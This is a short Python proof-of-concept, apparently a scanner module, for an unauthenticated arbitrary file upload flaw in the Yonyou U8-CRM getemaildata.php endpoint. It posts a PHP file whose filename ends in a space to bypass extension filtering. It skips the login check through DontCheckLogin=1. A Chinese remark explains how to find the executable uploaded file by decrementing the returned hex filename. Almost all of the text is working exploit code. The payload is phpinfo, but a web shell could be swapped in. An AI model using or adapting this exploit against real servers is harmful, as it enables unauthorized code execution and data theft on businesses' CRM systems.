import requests
import urllib

from inc.generate_random import generate_random_str
def verify(url):
    relsult = {
        'name': '用友U8-CRM客户关系管理系统getemaildata.php任意文件上传漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.63 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarykS5RKgl8t3nwInMQ'
    }
    char = generate_random_str(6)
    data = f'''------WebKitFormBoundarykS5RKgl8t3nwInMQ
    Content-Disposition: form-data; name="file"; filename="{char}.php "
    Content-Type: text/plain

    <?php phpinfo();?>
    ------WebKitFormBoundarykS5RKgl8t3nwInMQ'''
    vurl = urllib.parse.urljoin(url, "/ajax/getemaildata.php?DontCheckLogin=1")
    try:
        response = requests.post(vurl, headers=headers, data=data)
        if response.status_code == 200 and 'true' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
            relsult['remark'] = "上传之后返回的路径为E:\\U8SOFT\\turbocrm70\\code\\www\\tmpfile\\，文件名称为mhtB356.tmp.mht；文件不解析，需要访问另一个文件（上传之后会在目录下生成两个文件一个tmp.mht文件和一个tmp.php文件），访问的解析文件格式为udp***.tmp.php，星号部分为返回的文件名的十六进制减去一，例如：B356——>45910(十六进制)，45909（十六进制减一）——>b355。"
        return relsult

    except:
        return relsult